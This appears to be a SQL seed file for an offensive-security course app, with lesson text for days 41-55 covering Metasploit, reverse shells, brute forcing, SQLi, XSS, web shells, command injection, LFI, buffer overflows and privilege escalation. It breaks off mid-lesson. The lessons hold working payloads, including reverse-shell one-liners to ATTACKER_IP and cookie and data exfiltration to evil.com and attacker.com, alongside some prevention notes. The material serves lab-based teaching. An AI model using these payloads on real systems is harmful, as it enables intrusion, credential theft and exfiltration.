-- HackPath — Days 41-120 (Phases 3-6) + Quiz data

-- ================================================================
-- PHASE 3: EXPLOITATION BASICS (Days 41–60)
-- ================================================================

insert into public.days (id, phase, title, concept, lab_url, lab_platform, xp_reward) values

(41, 3, 'Metasploit Deep Dive',
'## Metasploit Framework — Complete Reference

**Module Hierarchy:**
```
exploits/    windows/smb/ms17_010_eternalblue
             unix/ftp/vsftpd_234_backdoor
             multi/handler  (catch reverse shells)
auxiliary/   scanner/smb/smb_ms17_010
             scanner/http/http_login
post/        linux/gather/enum_system
             multi/recon/local_exploit_suggester
payloads/    linux/x64/meterpreter/reverse_tcp
             windows/x64/meterpreter/reverse_tcp
             cmd/unix/reverse_bash
```

**Complete Workflow:**
```bash
msfconsole -q

# Search for exploit
search eternalblue type:exploit
search vsftpd type:exploit
search cve:2021-44228

# Use and configure
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.0.0.1
set LHOST 10.0.0.2     # Your IP (tun0 for VPN)
set LPORT 4444
check                   # Verify target is vulnerable

# Set payload
set payload windows/x64/meterpreter/reverse_tcp
run

# Post-exploitation
sysinfo
getuid
getsystem              # Try to get SYSTEM privilege
hashdump               # Dump NTLM hashes
run post/multi/recon/local_exploit_suggester
run post/windows/gather/credentials/credential_collector
```

**Database Integration:**
```bash
db_nmap -sV 10.0.0.0/24   # Save Nmap results to DB
hosts                       # List discovered hosts
services                    # List discovered services
vulns                       # List identified vulns
```

**Resource Scripts (.rc files):**
```bash
# Create auto_exploit.rc
echo "use exploit/multi/handler" > auto_exploit.rc
echo "set PAYLOAD linux/x64/meterpreter/reverse_tcp" >> auto_exploit.rc
echo "set LHOST tun0" >> auto_exploit.rc
echo "set LPORT 4444" >> auto_exploit.rc
echo "run" >> auto_exploit.rc

msfconsole -r auto_exploit.rc
```

**msfvenom — Payload Generation:**
```bash
# Linux reverse shell ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf

# Windows reverse shell EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php

# Encoded (AV evasion attempt)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x64/xor -i 5 -f exe -o encoded.exe
```',
'https://tryhackme.com/room/metasploitintro', 'TryHackMe', 50),

(42, 3, 'Reverse and Bind Shells',
'## Reverse and Bind Shells

A shell gives you command execution on a target system. The difference between reverse and bind shells is direction of connection.

**Reverse Shell:** Target connects BACK to you (attacker).
```
Attacker ← Target initiates connection
```
Most common — bypasses inbound firewall rules on target.

**Bind Shell:** Target listens, you connect TO it.
```
Attacker → Target listens on a port
```
Used when attacker has restrictive outbound firewall.

**Setting Up a Listener:**
```bash
# Netcat listener
nc -lvnp 4444

# Metasploit multi/handler (best for Meterpreter)
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST tun0
set LPORT 4444
run
```

**Reverse Shell One-Liners:**
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python 3
python3 -c ''import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])''

# PHP
php -r ''$sock=fsockopen("IP",4444);exec("/bin/sh <&3 >&3 2>&3");''

# PowerShell (Windows)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''IP'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"

# Netcat (if -e flag available)
nc -e /bin/sh IP 4444

# Netcat (without -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f
```

**Shell Stabilization (Essential — raw netcat shells die easily):**
```bash
python3 -c ''import pty;pty.spawn("/bin/bash")''
# Ctrl+Z (background netcat)
stty raw -echo; fg
# Press Enter
export TERM=xterm
stty rows 38 columns 116   # Set terminal size
```

**RevShells.com:** Generate any type of reverse shell automatically — choose language, IP, port.',
'https://tryhackme.com/room/introtoshells', 'TryHackMe', 50),

(43, 3, 'Password Attacks: Hydra and Medusa',
'## Password Attacks: Online Brute Forcing

**Hydra — The Standard for Online Attacks:**
```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target

# FTP brute force
hydra -l admin -P passwords.txt ftp://target

# HTTP form brute force
hydra -l admin -P passwords.txt target http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP Basic Auth
hydra -l admin -P passwords.txt target http-get /admin

# Multiple usernames
hydra -L users.txt -P passwords.txt ssh://target

# SMB
hydra -l administrator -P passwords.txt smb://target

# MySQL
hydra -l root -P passwords.txt mysql://target

# Custom port
hydra -l admin -P passwords.txt -s 2222 ssh://target

# Increase speed (careful — may lock accounts)
hydra -l admin -P passwords.txt -t 64 ssh://target
```

**Medusa (alternative):**
```bash
medusa -h target -u admin -P passwords.txt -M ssh
medusa -h target -u admin -P passwords.txt -M http -m DIR:/admin -m FORM:username=^USER^&password=^PASS^
```

**Creating Wordlists with CeWL:**
```bash
# Generate wordlist from target website
cewl https://target.com -d 3 -m 6 -w wordlist.txt
# -d 3 = depth 3, -m 6 = min length 6
```

**Mutating Wordlists with rsmangler/hashcat rules:**
```bash
# hashcat rules for mutations
hashcat -a 0 -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Common rules: best64, OneRuleToRuleThemAll, dive.rule
```

**Password Spraying (avoid lockout):**
```bash
# Try ONE password against MANY users (avoids account lockout)
crackmapexec smb 192.168.1.0/24 -u users.txt -p "Summer2024!" --continue-on-success
```

**Default Credentials:**
Always try before brute-forcing:
- admin:admin, admin:password, admin:(blank), root:root
- Check `default-credentials` NSE scripts
- SecLists: `Passwords/Default-Credentials/`',
'https://tryhackme.com/room/passwordattacks', 'TryHackMe', 50),

(44, 3, 'Hash Cracking with Hashcat and John',
'## Offline Password Cracking

When you dump password hashes from a system, crack them offline — no lockout risk, GPU acceleration.

**Identifying Hash Types:**
```bash
hashid ''5f4dcc3b5aa765d61d8327deb882cf99''  # MD5 → "password"
hash-identifier ''$2y$10$...''                # bcrypt
hashid ''$6$salt$hash''                        # SHA-512 crypt (Linux /etc/shadow)

# Common hash formats
MD5:    32 hex chars   (5f4dcc3b5aa765d61d8327deb882cf99)
SHA1:   40 hex chars
SHA256: 64 hex chars
NTLM:   32 hex chars (Windows passwords)
bcrypt: $2a$/$2b$/$2y$ prefix
SHA512crypt: $6$ prefix (Linux /etc/shadow)
```

**Hashcat Mode Numbers:**
```
0    = MD5
100  = SHA1
1000 = NTLM
1400 = SHA256
1800 = SHA512crypt (Linux shadow)
3200 = bcrypt
5600 = NetNTLMv2 (captured with Responder)
13100= Kerberos TGS (Kerberoasting)
16500= JWT (HS256)
22000= WPA2
```

**Hashcat Attack Modes:**
```bash
# Dictionary attack (-a 0)
hashcat -m 0 -a 0 hash.txt rockyou.txt

# Dictionary + rules (-a 0 -r)
hashcat -m 0 -a 0 hash.txt rockyou.txt -r best64.rule

# Brute force (-a 3) — mask attack
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a   # 6 chars, all charset
hashcat -m 0 -a 3 hash.txt ?u?l?l?l?d?d?d?s  # Password1!

# Combinator (-a 1) — combine two wordlists
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt

# Show cracked passwords
hashcat -m 0 hash.txt rockyou.txt --show
```

**Mask Charsets:**
```
?l = lowercase (a-z)
?u = uppercase (A-Z)
?d = digits (0-9)
?s = special (!@#...)
?a = all above combined
```

**John the Ripper:**
```bash
# Crack shadow file
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt

# Show cracked
john combined.txt --show

# Crack specific format
john --format=raw-md5 --wordlist=rockyou.txt hash.txt
john --format=bcrypt --wordlist=rockyou.txt hash.txt

# Zip password
zip2john protected.zip > zip.hash
john zip.hash --wordlist=rockyou.txt
```

**CrackStation.net:** Instant lookup for MD5, SHA1, SHA256 — huge precomputed tables. Try before running hashcat.',
'https://tryhackme.com/room/johntheripper0', 'TryHackMe', 50),

(45, 3, 'SQL Injection — Manual Exploitation',
'## SQL Injection: Manual Exploitation

SQL injection (SQLi) is the #1 web vulnerability — it allows attackers to manipulate database queries to extract, modify, or delete data.

**How SQLi Works:**
```sql
-- Vulnerable PHP code:
$query = "SELECT * FROM users WHERE username=''$input'' AND password=''$pass''";

-- Normal: username = john
SELECT * FROM users WHERE username=''john'' AND password=''hash''

-- Injected: username = '' OR 1=1-- -
SELECT * FROM users WHERE username='' OR 1=1-- -'' AND password=''x''
-- '' closes string, OR 1=1 always true, -- - comments out rest
-- Result: Returns ALL users → login as first user (admin)
```

**Testing for SQLi:**
```
''          — Single quote (syntax error → vulnerable)
''--        — Comment rest of query
'' OR 1=1-- - — Always-true condition
'' AND 1=2-- - — Always-false (check if page changes)
'' WAITFOR DELAY ''0:0:5''-- - — Time-based (MSSQL)
'' OR SLEEP(5)-- -             — Time-based (MySQL)
```

**UNION-Based Extraction:**
```sql
-- First: find number of columns
'' ORDER BY 1-- -
'' ORDER BY 2-- -  (keep increasing until error)
'' ORDER BY 4-- - → ERROR = 3 columns

-- Find which column displays data
'' UNION SELECT NULL,NULL,NULL-- -
'' UNION SELECT ''a'',NULL,NULL-- -  (look for ''a'' on page)

-- Extract database info
'' UNION SELECT database(),user(),version()-- -
-- Result: mydb, root@localhost, 8.0.26

-- Extract table names
'' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -

-- Extract column names
'' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name=''users''-- -

-- Extract data
'' UNION SELECT username,password,NULL FROM users-- -
```

**Blind SQLi (Boolean-based):**
```sql
-- No output but behavior changes
'' AND 1=1-- - → page loads normally
'' AND 1=2-- - → page different/empty → VULNERABLE (boolean blind)

-- Extract data character by character
'' AND SUBSTRING(username,1,1)=''a''-- -  (true if admin starts with a)
'' AND ASCII(SUBSTRING(password,1,1))>64-- -
```

**SQLi in Different Contexts:**
- GET params: `?id=1''`
- POST body: `username=admin''--+`
- Headers: `X-Forwarded-For: '' OR 1=1-- -`
- Cookies: `session=1'' OR 1=1-- -`',
'https://portswigger.net/web-security/sql-injection', 'PortSwigger', 50),

(46, 3, 'SQLMap — Automated SQL Injection',
'## SQLMap: Automated SQL Injection Exploitation

SQLMap automates the detection and exploitation of SQL injection vulnerabilities.

**Basic Usage:**
```bash
# Test GET parameter
sqlmap -u "http://target.com/page.php?id=1"

# Test POST parameter
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# With cookies (authenticated)
sqlmap -u "http://target.com/profile?id=1" --cookie="session=abc123"

# From Burp request file
sqlmap -r request.txt
```

**Discovery Options:**
```bash
--level=5      # Increase test depth (1-5)
--risk=3       # Risk level (1-3, be careful with 3)
--dbms=mysql   # Specify DBMS (faster)
--technique=BEUSTQ  # All techniques (Boolean, Error, Union, Stacked, Time, Query)
--batch        # Non-interactive (use defaults)
```

**Extraction Commands:**
```bash
# Get database info
sqlmap -u "url" --dbs           # List databases
sqlmap -u "url" -D mydb --tables  # List tables
sqlmap -u "url" -D mydb -T users --columns  # List columns
sqlmap -u "url" -D mydb -T users -C username,password --dump  # Extract data

# Get OS shell (if stacked queries + file privs)
sqlmap -u "url" --os-shell

# Read/Write files
sqlmap -u "url" --file-read="/etc/passwd"
sqlmap -u "url" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

**Bypassing WAF/Filters:**
```bash
--tamper=space2comment,between,randomcase  # Tamper scripts
--random-agent                              # Random User-Agent
--proxy=http://127.0.0.1:8080              # Route through Burp
--tor                                       # Use Tor network
--delay=2                                   # Delay between requests
```

**Tamper Scripts for WAF Bypass:**
```
space2comment     — Spaces → /**/
between           — Wrap keywords in BETWEEN
base64encode      — Base64 encode payload
charencode        — URL encode characters
randomcase        — rAnDoM cAsE keywords
apostrophemask    — Replace '' with UTF-8 variant
```

**Output and Reporting:**
```bash
# Output to CSV
sqlmap -u "url" -D db -T users --dump --output-dir=./results --dump-format=CSV
```

**Pro Tip:** Always run manual SQLi first to confirm vulnerability, then use SQLMap for extraction. This ensures you understand what you''re exploiting.',
'https://tryhackme.com/room/sqlmap', 'TryHackMe', 50),

(47, 3, 'Cross-Site Scripting (XSS)',
'## Cross-Site Scripting (XSS)

XSS allows attackers to inject malicious JavaScript into web pages viewed by other users. It is consistently in the OWASP Top 10 and one of the most common bug bounty findings.

**Three Types of XSS:**

**1. Reflected XSS:** Payload in URL, reflected in response immediately.
```
http://target.com/search?q=<script>alert(1)</script>
```
Not stored — victim must click malicious link. Used for phishing + session theft.

**2. Stored (Persistent) XSS:** Payload stored in database, served to all users.
```html
<!-- Comment form injection -->
<script>document.location=''https://evil.com/steal?c=''+document.cookie</script>
```
Critical — affects all users who view the page. High bug bounty payout.

**3. DOM-based XSS:** JavaScript on the page reads from DOM and writes unsafely.
```javascript
// Vulnerable code:
document.getElementById(''output'').innerHTML = location.hash.substring(1);
// Attack URL: https://target.com/#<img src=x onerror=alert(1)>
```

**Basic XSS Payloads:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
''><script>alert(1)</script>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<details open ontoggle=alert(1)>
```

**Filter Bypass Techniques:**
```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;49&#41;>

<!-- No parentheses (some CSP bypasses) -->
<img src=x onerror=alert`1`>

<!-- No angle brackets (attribute injection) -->
" onmouseover=alert(1) foo="

<!-- SVG namespace -->
<svg><animatetransform onbegin=alert(1)>
```

**Cookie Stealing Payload (Real Impact):**
```html
<script>
  new Image().src = ''http://attacker.com/steal?c=''+encodeURIComponent(document.cookie);
</script>
```

**XSS → Account Takeover Chain:**
1. Find stored XSS in comment/profile field
2. Inject cookie-stealing payload
3. Admin views page → cookie sent to you
4. Use cookie to authenticate as admin

**Prevention:** Content Security Policy (CSP), HttpOnly cookies, output encoding, input validation.',
'https://portswigger.net/web-security/cross-site-scripting', 'PortSwigger', 50),

(48, 3, 'File Upload Vulnerabilities',
'## File Upload Vulnerabilities

File upload features are one of the most impactful vulnerability classes — a successful exploit often yields Remote Code Execution (RCE).

**How File Upload Attacks Work:**
1. Upload a web shell (PHP, ASP, JSP)
2. Server saves it in a web-accessible directory
3. Navigate to the uploaded file
4. Execute OS commands through the web shell

**Simple PHP Web Shell:**
```php
<?php system($_GET[''cmd'']); ?>
```
Save as `shell.php`, upload, visit:
`http://target.com/uploads/shell.php?cmd=id`

**More Feature-Rich Shell:**
```php
<?php echo "<pre>" . shell_exec($_GET[''cmd'']) . "</pre>"; ?>
```

**Bypassing Client-Side Validation:**
- Just intercepting the request in Burp Suite — change the file type after the browser validates

**Bypassing Content-Type Checks:**
Server checks `Content-Type: image/jpeg` header:
```
Intercept in Burp → Change Content-Type: application/x-php → image/jpeg
```

**Bypassing Extension Blacklists:**
If `.php` is blocked, try:
```
.php3, .php4, .php5, .php7, .phtml, .phar
.PhP, .pHp (case variation — Windows IIS)
shell.php%00.jpg (null byte — old PHP)
shell.php.jpg (double extension)
```

**Bypassing Magic Bytes Checks:**
Server reads first bytes of file to verify it''s an image:
```bash
# Add PHP to a real JPEG (magic bytes preserved)
echo ''<?php system($_GET["cmd"]); ?>'' >> legit.jpg
# OR add GIF magic bytes before PHP:
echo -e ''GIF89a\n<?php system($_GET["cmd"]); ?>'' > shell.php.gif
```

**After Upload — Finding the File:**
```bash
# Look for upload path in response
# Common paths:
/uploads/shell.php
/files/shell.php
/images/shell.php
/media/shell.php
/static/shell.php

# Use Gobuster to find upload directory
gobuster dir -u http://target.com -w dirs.txt -x php
```

**From Web Shell to Full Reverse Shell:**
```
?cmd=bash -i >& /dev/tcp/ATTACKER/4444 0>&1
```

**Prevention:** Whitelist extensions, store outside webroot, rename files, use antivirus scanning, disable PHP execution in upload directories.',
'https://portswigger.net/web-security/file-upload', 'PortSwigger', 50),

(49, 3, 'Command Injection',
'## Command Injection

Command injection occurs when user input is passed to system commands without sanitization. It often results in direct Remote Code Execution.

**Vulnerable Code:**
```php
// PHP ping function
$ip = $_GET[''ip''];
system("ping -c 4 " . $ip);
```

**Basic Injection:**
```
Normal:  ip=8.8.8.8
Attack:  ip=8.8.8.8; id
                   ↑ Run second command after ping

# Command chaining operators:
;   — Run next command regardless
&&  — Run next if first succeeds
||  — Run next if first fails
|   — Pipe output to next command
`id` — Backtick command substitution
$(id) — Command substitution
```

**Testing Payloads:**
```bash
127.0.0.1; id
127.0.0.1 && id
127.0.0.1 | id
127.0.0.1 || id
127.0.0.1 `id`
127.0.0.1 $(id)
```

**Blind Command Injection (no output):**
```bash
# Time-based detection
127.0.0.1; sleep 5

# DNS/HTTP exfiltration
127.0.0.1; curl http://attacker.com/$(whoami)
127.0.0.1; nslookup $(cat /etc/passwd | head -1).attacker.com

# Out-of-band via Burp Collaborator
127.0.0.1; nslookup kf3jd5.burpcollaborator.net
```

**Filter Bypasses:**
```bash
# Spaces blocked → use IFS or ${IFS}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}

# Semicolons blocked → use newlines
ip=127.0.0.1%0aid

# Keywords blocked → use encoding
c''a''t /etc/passwd    # Quotes break keyword
/bin/c?t /etc/passwd   # Glob matching
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
```

**Gaining a Shell:**
```bash
127.0.0.1; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
127.0.0.1; python3 -c ''import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));...''
```

**Where to Test:** Any user-supplied input that might be used in OS commands: ping tools, DNS lookups, file converters, image processors, PDF generators.',
'https://portswigger.net/web-security/os-command-injection', 'PortSwigger', 50),

(50, 3, 'Path Traversal and LFI',
'## Path Traversal and Local File Inclusion

Path traversal reads files outside the intended directory. LFI (Local File Inclusion) includes local files in execution context — sometimes achieving RCE.

**Basic Path Traversal:**
```
Normal: http://target.com/download?file=report.pdf
Attack: http://target.com/download?file=../../../../etc/passwd
```

**Payload Variations:**
```
../../../etc/passwd
....//....//etc/passwd      (double-dot bypass)
..%2F..%2F..%2Fetc%2Fpasswd  (URL encoded)
%2e%2e%2f%2e%2e%2fetc/passwd (partial encoding)
..././../etc/passwd          (stripped traversal bypass)
/etc/passwd (absolute path)
```

**High-Value Files to Read:**
```bash
# Linux
/etc/passwd          — Usernames, home dirs, shells
/etc/shadow          — Password hashes (root only)
/etc/hosts           — Internal hostnames
/proc/self/environ   — Environment variables (often has source path)
/proc/self/cmdline   — Process command line
~/.ssh/id_rsa        — Private SSH key (if you know username)
/var/log/apache2/access.log  — Web logs (use for log poisoning)

# PHP specific
/var/www/html/config.php     — DB credentials
/var/www/html/.env           — Environment config
```

**PHP LFI — Log Poisoning (LFI → RCE):**
```bash
# 1. Poison the log with PHP code via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. Include the log file (which now contains PHP)
http://target.com/page.php?file=/var/log/apache2/access.log&cmd=id
```

**PHP Wrappers (LFI Bypasses + RCE):**
```
# Base64 encode source code (bypass WAF, read PHP)
?file=php://filter/convert.base64-encode/resource=config.php
# Decode: echo "BASE64" | base64 -d

# Execute arbitrary PHP
?file=data://text/plain,<?php system(''id'');?>

# Input wrapper (POST body)
curl -X POST "http://target.com/?file=php://input" -d "<?php system(''id'');?>"
```

**Tools:**
```bash
# dotdotpwn — automated traversal fuzzer
dotdotpwn -m http -h target.com -u "http://target.com/page.php?file=TRAVERSAL"

# LFISuite
python lfi_suite.py
```

**Prevention:** Whitelist allowed files, use realpath() to resolve paths, never pass user input directly to include/require.',
'https://portswigger.net/web-security/file-path-traversal', 'PortSwigger', 50),

(51, 3, 'Buffer Overflow — Concepts',
'## Buffer Overflow — Understanding the Vulnerability

Buffer overflows are classic but still-relevant vulnerabilities — especially in legacy systems, embedded devices, and CTF challenges.

**What Is a Buffer Overflow?**
A buffer is a fixed-size memory region. When a program copies more data into a buffer than it can hold, excess bytes overwrite adjacent memory — including the return address, which controls where execution goes next.

**Memory Layout (x86 Stack):**
```
High addresses  ↑
┌──────────────────┐
│   Caller frame   │
├──────────────────┤
│   Return Address │  ← EIP/RIP — controls execution flow
├──────────────────┤
│   Saved EBP      │  ← Base pointer
├──────────────────┤
│   Local variables│  ← Buffer lives here
│   [AAAA...AAAA]  │
│   [BBBBBBBBBBBB] │  ← Overflow fills buffer, overwrites EBP
│   [CCCCCCCC]     │  ← Overwrite return address → control EIP!
├──────────────────┤
│   Function args  │
Low addresses   ↓
```

**Classic Vulnerability:**
```c
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
    // If input > 64 bytes → overflow
}
```

**Exploitation Steps:**

1. **Fuzz** — Send increasing bytes until crash
```python
import socket
for i in range(100, 5000, 100):
    payload = b"A" * i
    s = socket.socket()
    s.connect(("target", 9999))
    s.send(payload)
    print(f"Sent {i} bytes")
```

2. **Find EIP offset** — Use pattern to find exact offset
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
# Send pattern, read EIP value from crash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2000 -q EIP_VALUE
```

3. **Control EIP** — Send offset bytes + new EIP value

4. **Find bad characters** — Characters that corrupt payload (\x00 = null terminator, always bad)

5. **Find JMP ESP** — Redirect execution to stack
```bash
!mona jmp -r esp -cpb "\x00"  # In Immunity Debugger
```

6. **Generate shellcode** — msfvenom payload

7. **Exploit** — EIP → JMP ESP → shellcode → shell!

Tomorrow we''ll implement this step by step.',
'https://tryhackme.com/room/bufferoverflowprep', 'TryHackMe', 50),

(52, 3, 'Buffer Overflow — Stack Smashing',
'## Buffer Overflow — Step-by-Step Exploitation

Today we exploit a real buffer overflow in a vulnerable binary using Immunity Debugger and mona.py.

**Setup:**
```bash
# Download Immunity Debugger (Windows)
# Install mona.py plugin:
# Copy mona.py to C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\
# In Immunity: !mona config -set workingfolder c:\mona\%p
```

**Vulnerable Service:** Use TryHackMe''s "Buffer Overflow Prep" room — it provides a Windows VM with a deliberately vulnerable service.

**Step 1: Fuzz**
```python
#!/usr/bin/env python3
import socket, time, sys

ip = "TARGET_IP"
port = 1337
buffer = []
counter = 100

while len(buffer) == 0 or counter <= 10000:
    buffer.append(b"A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.recv(1024)
        s.send(b"OVERFLOW1 " + string + b"\r\n")
        s.recv(1024)
        s.close()
        print(f"Fuzzing with {len(string)} bytes")
        time.sleep(0.5)
    except:
        print(f"Crashed at approximately {counter} bytes")
        sys.exit(0)
```

**Step 2: Find Offset**
```bash
# After crash, note approximate size (e.g., 2000 bytes)
msf-pattern_create -l 2000 > pattern.txt

python3 exploit.py  # Send pattern instead of A''s
# Read EIP value in Immunity: e.g., 386F4337

msf-pattern_offset -l 2000 -q 386F4337
# [*] Exact match at offset 1978
```

**Step 3: Control EIP**
```python
offset = 1978
padding = b"A" * offset
EIP = b"B" * 4   # Should see 42424242 in EIP
payload = padding + EIP
```

**Step 4: Find Bad Chars**
```python
badchars = (b"\x01\x02\x03...\xff")  # All bytes 01-FF
payload = b"A"*offset + b"B"*4 + badchars
# In Immunity: !mona compare -f C:\mona\bytearray.bin -a ESP_ADDRESS
```

**Step 5: Find JMP ESP**
```bash
!mona jmp -r esp -cpb "\x00\x0a"  # Exclude bad chars
# Note address: e.g., 0x625011af → little-endian: \xaf\x11\x50\x62
```

**Step 6: Generate Payload**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f py
```

**Step 7: Final Exploit**
```python
payload = b"A"*offset + b"\xaf\x11\x50\x62" + b"\x90"*16 + shellcode
```',
'https://tryhackme.com/room/bufferoverflowprep', 'TryHackMe', 50),

(53, 3, 'Privilege Escalation — Linux Basics',
'## Linux Privilege Escalation: Core Techniques

After gaining initial access, your goal is to escalate from a low-privilege user to root. This is where real engagements succeed or fail.

**First Steps After Getting a Shell:**
```bash
id                     # Who am I?
uname -a               # Kernel version and architecture
cat /etc/os-release    # OS version
cat /etc/passwd        # All users
cat /etc/group         # All groups
hostname               # Machine name
ps aux                 # Running processes
netstat -tulnp         # Listening services (internal only?)
env                    # Environment variables
```

**Automated Enumeration (Always Run This):**
```bash
# Upload and run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

# Linux Smart Enum
curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/download/3.3.0/lse.sh | sh -l 2
```

**Key Privesc Vectors:**

**1. SUID Binaries:**
```bash
find / -perm -4000 -type f 2>/dev/null
# Check GTFOBins for any results!
# Common SUID findings:
# /usr/bin/find → find . -exec /bin/sh \; -quit
# /usr/bin/vim → :!sh
# /usr/bin/python → import os; os.system("/bin/bash")
```

**2. Sudo Rights:**
```bash
sudo -l     # List sudo permissions
# (ALL) NOPASSWD: /usr/bin/vim → sudo vim -c ''!sh''
# (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c ''import os;os.system("/bin/sh")''
# GTFOBins has sudo escalation for every binary
```

**3. Cron Jobs:**
```bash
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/root 2>/dev/null
# Look for: scripts run as root, writable by you
# Edit the script → add reverse shell → wait for cron to execute
```

**4. Writable /etc/passwd:**
```bash
ls -la /etc/passwd
# If world-writable → add new root user:
echo ''hacker:$(openssl passwd -1 "password"):0:0::/root:/bin/bash'' >> /etc/passwd
su hacker  # Root!
```

**5. Kernel Exploits (Last Resort):**
```bash
uname -r    # Get kernel version
searchsploit linux kernel 4.4.0
# Common: Dirty COW (CVE-2016-5195), overlayfs
# WARNING: May crash the system
```',
'https://tryhackme.com/room/linprivesc', 'TryHackMe', 50),

(54, 3, 'Privilege Escalation — Windows',
'## Windows Privilege Escalation

Windows environments are the dominant target in corporate pentests. Knowing how to escalate from a low-privilege shell to SYSTEM is essential.

**Initial Enumeration:**
```cmd
whoami /all                    -- Current user and privileges
systeminfo                     -- OS, hotfixes, architecture
net users                      -- Local users
net localgroup administrators  -- Admin group members
ipconfig /all                  -- Network config
netstat -ano                   -- Listening connections with PIDs
tasklist /SVC                  -- Running services with names
```

**Automated Enumeration:**
```powershell
# WinPEAS (best automated tool)
.\winPEASany.exe

# PowerUp (PowerShell)
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

**Key Privesc Vectors:**

**1. Unquoted Service Paths:**
```bash
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
# Look for: C:\Program Files\My App\service.exe
# Attack: place C:\Program.exe → runs as SYSTEM on service restart
```

**2. Weak Service Permissions:**
```bash
# Check service permissions
accesschk.exe -ucqv SERVICENAME
sc qc SERVICENAME
# If writable → change binpath to reverse shell
sc config SERVICENAME binpath= "cmd /c net localgroup administrators attacker /add"
sc stop/start SERVICENAME
```

**3. AlwaysInstallElevated:**
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1 → install MSI as SYSTEM
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

**4. Token Impersonation (Potato Attacks):**
```bash
# Check privileges
whoami /priv
# SeImpersonatePrivilege → Potato attacks!
# Tools: JuicyPotato, PrintSpoofer, SweetPotato

.\PrintSpoofer.exe -i -c cmd
.\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c "{CLSID}"
```

**5. DLL Hijacking:**
```bash
# Find services loading non-existent DLLs
# Process Monitor filter: Result = NAME NOT FOUND, Path ends .dll
# Create malicious DLL in that location
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f dll -o missing.dll
```

**Stored Credentials:**
```cmd
cmdkey /list               -- Saved credentials
dir /a C:\Users\*\AppData\Roaming\FileZilla\recentservers.xml
dir /s *pass* == *cred* == *vnc* == *.config*
```',
'https://tryhackme.com/room/windows10privesc', 'TryHackMe', 50),

(55, 3, 'Exploitation with Common CVEs',
'## Exploiting Known CVEs in Real Environments

Real pentesting involves finding services running vulnerable versions and exploiting them with known CVEs.

**Methodology:**
```
1. Nmap version scan → service version
2. searchsploit service version → find exploits
3. Check NVD for CVE details and CVSS score
4. Check Metasploit for module
5. Download/use exploit
6. Test in lab first
7. Execute on target
```

**EternalBlue (CVE-2017-0144) — MS17-010:**
```bash
# Check if vulnerable
nmap --script smb-vuln-ms17-010 -p 445 TARGET

# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
